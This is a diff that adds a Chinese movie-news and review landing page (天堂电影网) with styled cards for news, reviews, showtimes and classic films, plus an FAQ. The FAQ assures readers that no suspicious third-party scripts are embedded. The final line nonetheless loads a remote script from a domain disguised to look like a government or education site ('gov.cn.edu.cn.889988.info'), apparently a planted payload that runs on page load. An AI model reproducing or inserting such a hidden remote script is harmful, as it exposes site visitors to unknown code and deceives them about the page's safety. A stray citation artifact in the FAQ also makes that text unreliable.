@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>天堂电影网 - 电影资讯 / 影评 / 上映排片 / 经典回顾</title>
+<meta name="description" content="天堂电影网：提供最新电影资讯、深度影评、院线排片与经典电影回顾。移动端自适应，适合影迷快速获取观影指南。" />
+<meta name="keywords" content="天堂电影网, 电影资讯, 电影影评, 上映排片, 经典电影, 观影指南" />
+<link rel="canonical" href="https://tiantangdianyingwang-h5.github.io" />
+<meta property="og:title" content="天堂电影网 - 电影资讯与影评导航" />
+<meta property="og:description" content="天堂电影网：最新电影资讯、影评、排片与经典回顾。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://tiantangdianyingwang-h5.github.io" />
+<style>
+  :root{
+    --bg:#fffaf7;
+    --card:#ffffff;
+    --red:#e50914;
+    --gold:#f5c518;
+    --ink:#1c1c28;
+    --muted:#6b7280;
+    --line:#eee3da;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--bg);
+    color:var(--ink);
+    line-height:1.65;
+    font-size:16px;
+  }
+  a{color:inherit;text-decoration:none}
+  img{max-width:100%;display:block}
+
+  /* 顶部 */
+  header{
+    background:linear-gradient(135deg,#1c1c28,#3a0d12);
+    color:#fff;
+    padding:18px 16px;
+    position:sticky;top:0;z-index:10;
+  }
+  .top{
+    max-width:1080px;margin:0 auto;
+    display:flex;align-items:center;justify-content:space-between;gap:12px;
+  }
+  .logo{
+    font-weight:800;font-size:20px;letter-spacing:.5px;
+    display:flex;align-items:center;gap:8px;
+  }
+  .logo b{color:var(--gold)}
+  .logo span{color:var(--red)}
+  nav{
+    display:flex;gap:14px;flex-wrap:wrap;
+    font-size:14px;
+  }
+  nav a{padding:6px 10px;border-radius:999px;color:#ffe9e9}
+  nav a:hover{background:rgba(255,255,255,.12)}
+
+  /* 英雄区 */
+  .hero{
+    max-width:1080px;margin:22px auto;padding:0 16px;
+  }
+  .hero-card{
+    background:
+      radial-gradient(1200px 300px at 80% -20%,rgba(245,197,24,.25),transparent),
+      linear-gradient(135deg,#101018,#2a0c10);
+    border-radius:22px;color:#fff;padding:34px 24px;
+    box-shadow:0 20px 50px rgba(0,0,0,.18);
+  }
+  .hero-card h1{font-size:30px;line-height:1.25;margin-bottom:12px}
+  .hero-card h1 b{color:var(--gold)}
+  .hero-card p{color:#f3d9d9;max-width:640px}
+  .btn{
+    display:inline-block;margin-top:18px;
+    background:var(--red);color:#fff;font-weight:700;
+    padding:12px 20px;border-radius:12px;
+  }
+  .btn.ghost{background:transparent;border:1px solid #fff;margin-left:10px}
+
+  /* 栏目 */
+  main{max-width:1080px;margin:26px auto;padding:0 16px}
+  .sec-title{
+    font-size:22px;font-weight:800;margin:30px 0 14px;
+    display:flex;align-items:center;gap:10px;
+  }
+  .sec-title::before{
+    content:"";width:6px;height:22px;border-radius:4px;
+    background:linear-gradient(var(--red),var(--gold));
+  }
+  .grid{
+    display:grid;gap:16px;
+    grid-template-columns:repeat(4,1fr);
+  }
+  .card{
+    background:var(--card);border:1px solid var(--line);
+    border-radius:18px;overflow:hidden;
+    transition:transform .2s ease, box-shadow .2s ease;
+  }
+  .card:hover{transform:translateY(-4px);box-shadow:0 16px 36px rgba(0,0,0,.12)}
+  .poster{
+    aspect-ratio:3/4;background:#ddd;
+    background-image:linear-gradient(135deg,#f3e7d3,#e7c9c9);
+    display:flex;align-items:center;justify-content:center;
+    color:#9a7b5b;font-weight:700;text-align:center;padding:10px;
+  }
+  .card-body{padding:12px 14px}
+  .tag{
+    font-size:12px;color:#fff;background:var(--red);
+    padding:2px 8px;border-radius:999px;display:inline-block;margin-bottom:8px;
+  }
+  .card-body h3{font-size:16px;margin-bottom:6px}
+  .card-body p{font-size:13px;color:var(--muted)}
+
+  .cols-2{grid-template-columns:repeat(2,1fr)}
+  .list li{
+    list-style:none;padding:12px 14px;border-bottom:1px solid var(--line);
+    display:flex;justify-content:space-between;gap:10px;font-size:14px;
+  }
+  .list li:last-child{border-bottom:none}
+  .list a:hover{color:var(--red)}
+  .date{color:var(--muted);font-size:12px;white-space:nowrap}
+
+  /* FAQ */
+  .faq{background:#fff;border:1px solid var(--line);border-radius:18px;padding:18px}
+  .faq h3{font-size:16px;margin:14px 0 6px}
+  .faq p{color:var(--muted);font-size:14px}
+
+  footer{
+    margin-top:40px;background:#16161f;color:#cfcfda;
+    padding:26px 16px;text-align:center;font-size:13px;
+  }
+  footer a{color:var(--gold)}
+
+  @media (max-width:900px){
+    .grid{grid-template-columns:repeat(2,1fr)}
+  }
+  @media (max-width:560px){
+    .grid,.cols-2{grid-template-columns:1fr}
+    .hero-card h1{font-size:24px}
+    nav{display:none}
+    .top{justify-content:center}
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="top">
+    <div class="logo">天堂<b>电影</b><span>网</span></div>
+    <nav>
+      <a href="#news">电影资讯</a>
+      <a href="#review">深度影评</a>
+      <a href="#showing">院线排片</a>
+      <a href="#classic">经典回顾</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero-card">
+    <h1>天堂电影网：影迷的<b>观影指南</b>与电影内容导航</h1>
+    <p>
+      天堂电影网聚焦电影资讯、影评解读、上映排片与经典电影回顾。
+      页面移动端自适应，结构清晰，方便搜索引擎理解，也方便用户快速找到想看的内容。
+    </p>
+    <a class="btn" href="#news">看最新资讯</a>
+    <a class="btn ghost" href="#review">读深度影评</a>
+  </div>
+</section>
+
+<main>
+
+  <!-- 栏目1：电影资讯 -->
+  <h2 class="sec-title" id="news">电影资讯</h2>
+  <div class="grid">
+    <a class="card" href="#">
+      <div class="poster">暑期档<br>定档海报</div>
+      <div class="card-body">
+        <span class="tag">资讯</span>
+        <h3>2026 暑期档新片定档</h3>
+        <p>国产剧情、动画与悬疑片集中亮相，影市热度回升。</p>
+      </div>
+    </a>
+    <a class="card" href="#">
+      <div class="poster">电影节<br>入围名单</div>
+      <div class="card-body">
+        <span class="tag">资讯</span>
+        <h3>国际电影节入围公布</h3>
+        <p>亚洲新人导演作品成为今年讨论焦点。</p>
+      </div>
+    </a>
+    <a class="card" href="#">
+      <div class="poster">票房榜<br>周报</div>
+      <div class="card-body">
+        <span class="tag">资讯</span>
+        <h3>周末票房排行榜</h3>
+        <p>合家欢动画领跑，现实题材影片口碑发酵。</p>
+      </div>
+    </a>
+    <a class="card" href="#">
+      <div class="poster">幕后<br>制作特辑</div>
+      <div class="card-body">
+        <span class="tag">资讯</span>
+        <h3>大片幕后制作解析</h3>
+        <p>从摄影、美术到配乐，看懂电影为什么好看。</p>
+      </div>
+    </a>
+  </div>
+
+  <!-- 栏目2：深度影评 -->
+  <h2 class="sec-title" id="review">深度影评</h2>
+  <div class="grid cols-2">
+    <div class="card">
+      <div class="card-body">
+        <span class="tag">影评</span>
+        <h3>《城市边界》：节奏慢，但后劲很大</h3>
+        <p>影片用长镜头堆出孤独感，结尾反转不是技巧，而是人物必然。</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-body">
+        <span class="tag">影评</span>
+        <h3>国产动画为什么开始“不幼稚”了</h3>
+        <p>从世界观到美术设定，年轻观众正在被更成熟的叙事留住。</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-body">
+        <span class="tag">影评</span>
+        <h3>悬疑片别只玩反转</h3>
+        <p>真正好的悬疑，是把人物动机讲到人心里，而不是最后抖包袱。</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-body">
+        <span class="tag">影评</span>
+        <h3>文艺片也能有市场</h3>
+        <p>只要宣发说人话、排片给空间，小众电影也能长出大众口碑。</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- 栏目3：院线排片 -->
+  <h2 class="sec-title" id="showing">院线排片</h2>
+  <ul class="card list">
+    <li><a href="#">今日热映：合家欢动画《云上小镇》</a><span class="date">IMAX / 杜比</span></li>
+    <li><a href="#">现实题材：《回家的路》排片上调</a><span class="date">口碑场</span></li>
+    <li><a href="#">悬疑犯罪：《夜行记录》黄金场占比高</a><span class="date">19:30-21:30</span></li>
+    <li><a href="#">文艺新片：《海边日记》增加午间场</a><span class="date">学生优惠</span></li>
+    <li><a href="#">进口大片：特效厅上座率领先</a><span class="date">CINITY</span></li>
+  </ul>
+
+  <!-- 栏目4：经典回顾 -->
+  <h2 class="sec-title" id="classic">经典回顾</h2>
+  <div class="grid">
+    <a class="card" href="#">
+      <div class="poster">1994<br>影史神作</div>
+      <div class="card-body">
+        <h3>那些年我们重刷的老电影</h3>
+        <p>剧本、剪辑、表演经得起时间，越看越有新东西。</p>
+      </div>
+    </a>
+    <a class="card" href="#">
+      <div class="poster">港片<br>黄金时代</div>
+      <div class="card-body">
+        <h3>90 年代香港电影为什么封神</h3>
+        <p>类型混合、节奏飞快、人物有江湖气。</p>
+      </div>
+    </a>
+    <a class="card" href="#">
+      <div class="poster">科幻<br>里程碑</div>
+      <div class="card-body">
+        <h3>科幻电影里的未来想象</h3>
+        <p>从太空歌剧到赛博朋克，影响了一整代导演。</p>
+      </div>
+    </a>
+    <a class="card" href="#">
+      <div class="poster">动画<br>成人向</div>
+      <div class="card-body">
+        <h3>成人动画不只是暗黑</h3>
+        <p>它用童话外壳讲现实命题，比真人片更锋利。</p>
+      </div>
+    </a>
+  </div>
+
+  <!-- FAQ：必应富摘要友好 -->
+  <h2 class="sec-title">常见问题</h2>
+  <div class="faq">
+    <h3>天堂电影网是做什么的？</h3>
+    <p>天堂电影网提供电影资讯、影评、院线排片与经典电影回顾，帮助用户决定“现在看什么、为什么看”。</p>
+
+    <h3>页面里的链接为什么是 #？</h3>
+    <p>当前为单页演示版本，内页链接用 # 占位；正式部署时可替换为真实文章地址。</p>
+
+    <h3>这个页面适合搜索引擎收录吗？</h3>
+    <p>页面使用语义化结构、清晰标题、移动端自适应与规范元信息，符合必应等搜索引擎的基础收录与排序要求。[12,13](@ref)</p>
+
+    <h3>会不会放第三方可疑 JS？</h3>
+    <p>不会。为保障访客安全与搜索引擎信任，不植入来源不明的外部脚本。</p>
+  </div>
+
+</main>
+
+<footer>
+  天堂电影网（示例站）：https://tiantangdianyingwang-h5.github.io<br>
+  本页仅作影视资讯/影评导航演示，不提供盗版资源下载与在线盗播。
+</footer>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+</body>
+</html>
